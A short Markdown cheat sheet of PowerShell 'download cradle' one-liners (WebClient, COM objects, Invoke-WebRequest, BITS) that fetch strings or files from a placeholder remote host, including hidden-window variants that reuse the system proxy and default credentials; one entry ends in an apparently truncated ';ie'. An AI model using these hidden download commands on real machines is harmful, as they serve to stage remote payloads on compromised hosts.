### Download a string - DownloadString
```
(New-Object Net.WebClient).downloadString('https://&lt;rhost&gt;')
```

### Download a string - DownloadData
```
$str = (New-Object Net.WebClient).DownloadData('https://&lt;rhost&gt;'); [Text.Encoding]::UTF8.GetString($str)
```

### Download a string - ComObject
```
$ie = New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('https://&lt;rhost&gt;'); sleep 5; $response=$ie.Document.body.innerHTML; $ie.quit(); $response -replace "&lt;pre&gt;","" -replace "&lt;/pre&gt;",""
```

### Download a string - ComObject
```
$h = New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','https://&lt;rhost&gt;',$false); $h.send(); echo $h.responseText
```

### Download string using default proxy settings - Downloadstring
```
powershell.exe -nop -w hidden -c $t=New-Object Net.Webclient; $t.proxy=[Net.WebRequest]::GetSystemWebProxy(); $t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $t.downloadstring('https://&lt;rhost&gt;')
```

### Download string using default proxy settings - DownloadString
```
powershell.exe -nop -w hidden -c $t=New-Object Net.Webclient; $t.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; $t.downloadString('http://&lt;rhost&gt;')
```

### Download string - XML Load
```
$XmlDoc = New-Object System.Xml.XmlDocument
$XmlDoc.Load("&lt;urlToXmlFile&gt;")
$XmlDoc.&lt;node&gt;.&lt;node&gt;.&lt;node&gt;
```

### Download a file - Invoke-Web-Request
```
iwr 'https://&lt;rhost&gt;' -OutFile &lt;file&gt; -UseBasicParsing
```

### Download a file - Invoke-RestMethod
```
Invoke-RestMethod 'https://&lt;rhost&gt;' -OutFile &lt;file&gt;
```

### Download a file - Start-BitsTransfer
```
Start-BitsTransfer 'https://&lt;rhost&gt;' -Destination &lt;file&gt;
```

### Download a file - DownloadFile
```
$webClient = [Net.WebClient]::new(); $webClient.DownloadFile('https://&lt;rhost&gt;', '&lt;fullPathFile&gt;')
```

### Download a file - ComObject
```
[Net.WebRequest]::DefaultWebProxy; [Net.CredentialCache]::DefaultNetworkCredentials; $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://&lt;rhost&gt;',$false);$h.send();ie
```


### Configure TLS version
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::'Tls11,Tls12'
```



